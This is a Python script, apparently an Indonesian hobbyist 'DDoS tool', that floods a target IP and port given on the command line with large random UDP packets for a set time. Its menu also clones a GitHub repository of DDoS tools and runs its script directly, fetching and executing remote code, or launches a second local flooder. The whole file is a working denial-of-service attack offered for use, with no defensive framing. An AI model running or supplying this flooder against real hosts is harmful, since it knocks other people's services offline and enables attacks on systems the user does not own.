import sys,os,time,random,socket
from colorama import Fore,Back,init

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW
Hijau="\033[1;92m"
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"

def tanya():
    tanya=input(f"{putih}Main Lagi{abu}? {putih}({biru}y{B}/{biru}n{W}){R}:{W}")
    if tanya == "y" or tanya == "Y":
        os.system("python ddos_tytyd.py")
    if tanya == "n" or tanya == "N":
        print (Back.BLUE+Fore.WHITE+"Thx For Use My Tools"+Fore.WHITE)

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print ("\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport))

def main():
    try:
        print (len(sys.argv))
        if len(sys.argv) != 4:
            usage()
        else:
            flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
    except IndexError:
        sys.exit("use:python ddos.py bla")

def usage():
	print(f"""
{R}________   {W}    .___
{R}\______ \  {W}  __| _/____  ______
{R} |    |  \ {W} / __ |/  _ \/  ___/\n{R} |    `   \{W}/ /_/ (  <_> )___ 
{R}/_______  /{W}\____ |\____/____ >
{R}        \/ {W}     \/          \/ {G}.{W}v{R}2\n""")

def v1():
    os.system("git clone https://github.com/AmmarrBN/DDOS_TOOLS && cd DDOS_TOOLS && python ddos.py")
    

def put():
    usage()
    print(f"""
{putih}1{R}.{W}DDOS-v1 {biru}({G}Low{biru})
{putih}2{R}.{W}DDOS-v2 {biru}({G}High{biru})
""")
    put=input("─⟩ ")
    if put == "1":
        v1()
    if put == "2":
        os.system("python v2.py")

if __name__ == '__main__':
    put()
